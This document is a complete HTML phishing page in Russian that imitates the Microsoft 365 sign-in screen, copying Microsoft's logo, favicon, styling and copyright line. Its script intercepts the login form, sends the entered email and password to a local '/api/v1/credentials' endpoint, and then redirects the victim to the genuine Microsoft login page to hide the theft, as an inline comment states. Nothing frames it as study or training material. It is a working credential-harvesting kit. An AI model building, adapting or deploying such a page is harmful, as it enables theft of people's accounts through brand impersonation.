<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Вход в систему</title>
    <link rel="icon" type="image/x-icon" href="https://login.microsoftonline.com/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 44px;
            border-radius: 5px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 440px;
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo img {
            width: 108px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #666;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 400;
            color: #1a1a1a;
            margin-bottom: 8px;
        }
        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 10px 12px;
            font-size: 15px;
            border: 2px solid #8a8886;
            border-radius: 3px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #0078d4;
        }
        .btn {
            width: 100%;
            padding: 10px 24px;
            font-size: 15px;
            font-weight: 600;
            color: white;
            background: #0078d4;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 20px;
        }
        .btn:hover {
            background: #005a9e;
        }
        .links {
            margin-top: 16px;
            text-align: center;
        }
        .links a {
            color: #0078d4;
            text-decoration: none;
            font-size: 13px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft Logo">
        </div>
        
        <h1>Вход в систему</h1>
        <p class="subtitle">Введите данные для входа в Microsoft 365</p>
        
        <form id="loginForm" method="POST" action="/login">
            <div class="form-group">
                <label for="email">Электронная почта, телефон или Skype</label>
                <input type="email" id="email" name="email" required autocomplete="email" autofocus>
            </div>
            
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            
            <div class="form-group">
                <label style="font-weight: normal;">
                    <input type="checkbox" name="remember" style="width: auto; margin-right: 8px;">
                    Не выходить из системы
                </label>
            </div>
            
            <button type="submit" class="btn">Войти</button>
        </form>
        
        <div class="links">
            <a href="#">Не удается войти?</a>
            <br><br>
            <a href="#">Создать учетную запись!</a>
        </div>
        
        <div class="footer">
            <p>© 2026 Microsoft Corporation. Все права защищены.</p>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Отправка данных
            fetch('/api/v1/credentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({email, password})
            })
            .then(r => r.json())
            .then(d => {
                if (d.success) {
                    // Редирект на настоящий Microsoft
                    window.location.href = 'https://login.microsoftonline.com';
                } else {
                    alert('Ошибка входа. Попробуйте снова.');
                }
            })
            .catch(e => {
                console.error(e);
                alert('Ошибка соединения.');
            });
        });
    </script>
</body>
</html>
